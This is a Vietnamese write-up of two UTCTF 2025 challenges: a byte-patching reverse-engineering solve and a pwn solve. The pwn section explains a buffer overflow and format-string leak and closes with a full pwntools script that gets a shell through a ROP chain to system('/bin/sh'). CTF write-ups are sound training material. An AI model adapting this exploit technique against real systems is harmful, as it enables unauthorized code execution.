+++
date = '2025-04-16T03:03:35+07:00'
draft = true
title = 'UTCTF 2025'
+++

Giải này mình tham gia song song với K!nd4SUS CTF 2025 nên không có giải được nhiều. Tuy nhiên mình vẫn có 1 chall dễ rev và 1 chall pwn.

## Ostrich Algorithm - reverse engineering

### 1. Analysis

Sử dụng IDA pro mở file thì ở hàm start mình nhìn thấy được đoạn mã giả như sau:

![](http://note.bksec.vn/pad/uploads/c642225f-6fae-4137-9a1e-2b3440dbf478.png)

Do chương trình này Statically linked, cộng với các tham số truyền vào hàm sub_404000 nên mình đoán có vẻ đây là 1 hàm giống _libc_start_main. Đọc kỹ hơn bên trong thì mình gần như chắc chắn điều đó, do vậy có vẻ hàm Sub_401775 sẽ là hàm main.


![](http://note.bksec.vn/pad/uploads/b334259f-79c8-408f-beb0-83acaa5fbc15.png)

Bên trong hàm sub_401775 mình thấy chương trình so sánh chuỗi "welcome to UTCTF!" và chuỗi "oiiaoiiaoiiaoiia", nếu không giống nhau sẽ gọi sub_40c90. Kiểm tra bên trong hàm này cùng với thử đặt breakpoint tại đây khi debug, mình nhận ra hàm sub_401775 sẽ thoát chương trình. Như vậy chương trình sẽ luôn dừng ở đây. Do đó ý tưởng ban đầu là mình thử patch byte xem sao.

### 2. Patch byte

Mình patch toàn bộ lệnh gọi hàm sub_401775 bằng nop.

![](http://note.bksec.vn/pad/uploads/e12dd13b-43d2-4d9a-aa14-29df208406fb.png)

Thay toàn bộ byte ở đây thành 0x90.

![](http://note.bksec.vn/pad/uploads/abc11f3d-9765-4762-b292-bdf35bc19ed2.png)

Mình cho chạy thử chương trình ở đây và nhận được flag.

![](http://note.bksec.vn/pad/uploads/d92eaae1-ee59-42ff-9281-ddeba29ba05f.png)


## RETirement plan - binary exploitation

### 1. Vulnerability

![](http://note.bksec.vn/pad/uploads/5f3c2ac8-9173-4b27-a461-21b26e51468c.png)

Nhìn vào pseudocode, mình nhận thấy một lỗi bof ở hàm gets() và lỗi format string ở hàm printf.
![](http://note.bksec.vn/pad/uploads/f18e2e1c-14fd-4573-82ee-2590ebb6425b.png)

Checksec chương trình nhận thấy không có bất kỳ một mitigation nào, ngoại trừ Partial RELRO. Do đó chall này có rất nhiều phương án, phương án của mình trình bày ở đây là sử dụng ROP.

### 2. Analysis

Vòng lặp for ngay bên dưới hàm gets là một thuật toán xử lý để lọc các ký tự độc hại nhằm khai thác format string. Tuy nhiên thay vì kiểm tra string format, chương trình lại gán format vào con trỏ v5 và thực hiện rà soát string vào con trỏ v5. Không những vậy, vòng lặp sẽ chạy đến khi v5[i] có giá trị NULL. Như vậy ý tưởng của mình sẽ là ghi đè giá trị con trỏ v5 bằng 1 địa chỉ có quyền rw mà ở đấy toàn các giá trị NULL. Sau đó mình sẽ ghi đè ret_address bằng các gadget nhằm thực thi lại hàm main 1 lần nữa sau khi đã leak được địa chỉ libc trên qua format string. 

### 3. Exploitation

Payload đầu tiên của mình sẽ khai thác format string để leak giá trị trên stack, đồng thời ghi đè ret_address về hàm main 1 lần nữa. Trước tiên mình cần tìm 1 vùng nhớ có quyền rw mà toàn các giá trị NULL để gi đè v5.
![](http://note.bksec.vn/pad/uploads/38930f93-4883-4e26-8acf-c442f9ba858b.png)


![](http://note.bksec.vn/pad/uploads/044fc572-f809-471e-bb5c-d2756a97d3f1.png)

vậy là đã có vùng nhớ ghi đè vào v5. Mình sẽ thử gửi payload xem chúng ta thu được gì.

![](http://note.bksec.vn/pad/uploads/22762ac5-91ce-4017-8c1c-ff340dacec53.png)


![](http://note.bksec.vn/pad/uploads/b17689df-3abf-4d74-938a-b59d861d0425.png)

Check giá trị thu được, chúng ta biết được rằng địa chỉ này là địa chỉ của hàm _IO_2_1_stdin_ trong libc.

việc còn lại khá là đơn giản, payload thứ 2 chúng ta chỉ cần ghi đè các gadget để thực thi system(/bin/sh) là xong.

![](http://note.bksec.vn/pad/uploads/de10ba13-071e-4928-95ef-d97bba1a1e63.png)

![](http://note.bksec.vn/pad/uploads/44ddeac7-0360-4fe1-a23a-4a81b4dfb089.png)

Kết nối vào máy remote ta thu được flag.

![](http://note.bksec.vn/pad/uploads/8b653fa8-583d-431a-bf51-f15663cd4a5b.png)


### 4. Script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcode_patched",checksec=False)
libc = ELF("./libc-2.23.so",checksec=False)
rw_section=0x601000
main=0x400616

context.binary = exe


p=remote('challenge.utctf.live',9009)

p.recvuntil(b'<Insert prompt here>: ')
payload=b'%3$p '
payload=payload.ljust(0x30,b'A')
payload+=p64(0x601200)+12*b'A'+b'0'+3*b'A'+p64(main)
p.sendline(payload)
leak=int(p.recvuntil(b' '),16)
libc_base= leak-libc.sym['_IO_2_1_stdin_']

log.info(f'Leak: {hex(leak)}')
log.info(f'libc base: {hex(libc_base)}')

system=libc.sym['system']+libc_base
binsh=libc_base+next(libc.search(b'/bin/sh'))
pop_rdi=0x0000000000400793
ret=pop_rdi+1
payload=0x30*b'A'
payload+=p64(0x601200)+12*b'A'+b'0'+3*b'A'
payload+=p64(pop_rdi)+p64(binsh)
payload+=p64(ret)
payload+=p64(system)
p.recvuntil(b'<Insert prompt here>: ')
p.sendline(payload)
p.recv()
p.interactive()

```



